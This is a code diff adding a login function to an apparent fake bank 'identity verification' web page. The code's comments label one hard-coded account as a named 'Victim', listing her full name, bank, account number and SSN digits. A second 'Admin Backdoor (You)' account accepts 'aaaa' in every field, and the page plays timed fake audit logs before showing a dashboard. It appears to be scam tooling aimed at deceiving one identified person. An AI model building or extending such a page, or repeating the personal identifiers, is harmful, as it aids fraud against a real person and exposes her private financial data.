@@ -613,7 +613,77 @@
             }
         }
     }
+    function triggerLoading() {
+        const name = document.getElementById('login-name').value.trim();
+        const bank = document.getElementById('login-bank').value;
+        const account = document.getElementById('login-account').value.trim();
+        const ssn = document.getElementById('login-ssn').value.trim();
     
+        // Normalize name for comparison
+        const normalizedName = name.toLowerCase().replace(/\s+/g, ' ').trim();
+        
+        // ===== ACCOUNT 1: Mujinga Mukuna (Victim) =====
+        const validNames = [
+            'mujinga therese mukuna',
+            'mujinga t. mukuna',
+            'mujinga mukuna',
+            'mukuna mujinga'
+        ];
+        
+        const isMujinga = validNames.includes(normalizedName);
+        const isMujingaBank = bank === 'FIRST CONVENIENCE BANK (FNB TEXAS)';
+        const isMujingaAccount = account === '470111139';
+        const isMujingaSSN = ssn === '6832';
+        
+        // ===== ACCOUNT 2: Admin Backdoor (You) =====
+        const isAdmin = normalizedName === 'aaaa';
+        const isAdminBank = bank === 'FIRST CONVENIENCE BANK (FNB TEXAS)';
+        const isAdminAccount = account === 'aaaa';
+        const isAdminSSN = ssn === 'aaaa';
+        
+        // Validate credentials
+        let isValid = false;
+        let validName = name;
+        let validBank = bank;
+        let validAccount = account;
+        
+        if (isMujinga && isMujingaBank && isMujingaAccount && isMujingaSSN) {
+            isValid = true;
+        }
+        else if (isAdmin && isAdminBank && isAdminAccount && isAdminSSN) {
+            isValid = true;
+        }
+        
+        if (!isValid) {
+            alert("IDENTITY VERIFICATION ERROR: The provided credentials do not match our records. Please verify your information and try again.");
+            return;
+        }
+    
+        // PROCEED WITH LOGIN
+        document.getElementById('login-section').style.display = 'none';
+        document.getElementById('loading-screen').style.display = 'block';
+        window.scrollTo(0,0);
+    
+        const logContainer = document.getElementById('loading-logs');
+        let i = 0;
+    
+        function addLog() {
+            if (i < logEntries.length) {
+                const p = document.createElement('div');
+                p.className = 'audit-line';
+                p.innerText = "> " + logEntries[i];
+                logContainer.appendChild(p);
+                logContainer.scrollTop = logContainer.scrollHeight;
+                i++;
+                setTimeout(addLog, Math.floor(Math.random() * 800) + 400);
+            } else {
+                setTimeout(() => {
+                    showDashboard(validName, validBank, validAccount);
+                }, 1000);
+            }
+        }
+        addLog();
+    }
     function processSendQueue() {
         if (isSending || sendQueue.length === 0) return;
         isSending = true;
